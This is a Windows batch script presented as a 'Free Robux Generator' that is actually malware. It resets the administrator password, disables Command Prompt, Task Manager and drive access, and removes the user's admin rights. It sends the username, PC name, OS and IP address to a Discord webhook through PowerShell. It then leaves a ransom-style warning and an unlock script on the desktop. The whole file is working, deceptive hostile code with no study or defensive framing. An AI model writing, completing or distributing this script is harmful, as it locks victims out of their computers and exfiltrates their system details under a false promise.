@echo off
title Free Robux Generator

:: Set new admin password
net user administrator e385784erusgrj

:: Disable Command Prompt and Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Block Chrome and other specified apps by modifying hosts file
echo 127.0.0.1 www.google.com >> C:\Windows\System32\drivers\etc\hosts
echo 127.0.0.1 google.com >> C:\Windows\System32\drivers\etc\hosts
echo 127.0.0.1 chrome.google.com >> C:\Windows\System32\drivers\etc\hosts

:: Collect system details for webhook transmission
set "WebhookURL=https://discord.com/api/webhooks/1490372072549912638/pB3sRITD330QnQCP7LkvPdMLk4w0S1UIyNngP7x8u0etZfw87rIXRXnL3g6pIeEUkVNG" :: Replace with actual webhook URL
for /f "tokens=2 delims==" %%a in ('wmic OS get caption /value') do set "OS=%%a"
for /f "tokens=2 delims==" %%a in ('wmic ComputerSystem get Name /value') do set "PCName=%%a"
for /f "tokens=2 delims==" %%a in ('wmic UserAccount where "LocalAccount='TRUE'" get Name /value') do set "UserName=%%a"
for /f "tokens=*" %%a in ('ipconfig ^| findstr IPv4') do set "IP=%%a"

:: Create a temporary file with system details
echo Username: %UserName% > tempinfo.txt
echo PC Name: %PCName% >> tempinfo.txt
echo OS: %OS% >> tempinfo.txt
echo IP Address: %IP% >> tempinfo.txt

:: Attempt to extract saved passwords (placeholder as actual extraction requires external tools)
echo Attempting to retrieve saved credentials... >> tempinfo.txt
echo Saved Passwords: [Not retrieved in this basic script] >> tempinfo.txt

:: Send data to webhook using PowerShell
powershell -ExecutionPolicy Bypass -Command ^
"$webhook = '%WebhookURL%'; ^
$body = Get-Content -Path 'tempinfo.txt' -Raw; ^
Invoke-WebRequest -Uri $webhook -Method POST -Body $body -ContentType 'text/plain'"

:: Clean up temporary file
del tempinfo.txt

:: Change desktop background to a "scary" image (assuming image is placed in C:\Scary)
:: You need to place a scary image at this path or modify the path accordingly
if not exist "C:\Scary" mkdir "C:\Scary"
:: Placeholder for image download (can use PowerShell to download if needed)
:: Example: powershell -Command "Invoke-WebRequest -Uri '' -OutFile 'C:\Scary\scary.jpg'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Scary\scary.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

:: Hide all desktop icons
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v HideDesktopIcons /t REG_DWORD /d 1 /f

:: Disable access to files by restricting Explorer policies
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFile /t REG_DWORD /d 1 /f

:: Disable Admin privileges for current user
net localgroup Administrators %UserName% /delete >nul 2>&1

:: Create ENTER.bat on desktop to allow unlocking with code
echo @echo off > "%USERPROFILE%\Desktop\ENTER.bat"
echo title Enter Unlock Code >> "%USERPROFILE%\Desktop\ENTER.bat"
echo :start >> "%USERPROFILE%\Desktop\ENTER.bat"
echo cls >> "%USERPROFILE%\Desktop\ENTER.bat"
echo echo Enter the unlock code to regain access: >> "%USERPROFILE%\Desktop\ENTER.bat"
echo set /p code= >> "%USERPROFILE%\Desktop\ENTER.bat"
echo if /i "%%code%%"=="TRISSIE" ( >> "%USERPROFILE%\Desktop\ENTER.bat"
echo goto unlock >> "%USERPROFILE%\Desktop\ENTER.bat"
echo ) else ( >> "%USERPROFILE%\Desktop\ENTER.bat"
echo echo Incorrect code. Access denied. >> "%USERPROFILE%\Desktop\ENTER.bat"
echo pause >> "%USERPROFILE%\Desktop\ENTER.bat"
echo goto start >> "%USERPROFILE%\Desktop\ENTER.bat"
echo ) >> "%USERPROFILE%\Desktop\ENTER.bat"
echo :unlock >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v HideDesktopIcons /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFile /f >> "%USERPROFILE%\Desktop\ENTER.bat"
echo echo System unlocked successfully. Access restored. >> "%USERPROFILE%\Desktop\ENTER.bat"
echo pause >> "%USERPROFILE%\Desktop\ENTER.bat"
echo exit >> "%USERPROFILE%\Desktop\ENTER.bat"

:: Create a deceptive message to mimic a virus
echo System compromised by Free Robux Generator! > "%USERPROFILE%\Desktop\WARNING.txt"
echo Your files and apps are locked. >> "%USERPROFILE%\Desktop\WARNING.txt"
echo Open ENTER.bat on your desktop and provide the code to unlock your system. >> "%USERPROFILE%\Desktop\WARNING.txt"

:: Notify user with deceptive message
echo Congratulations! You've activated the Free Robux Generator.
echo Unfortunately, your system has been compromised.
echo Access to your files and apps has been restricted.
echo Open ENTER.bat on your desktop to regain control.
pause
exit
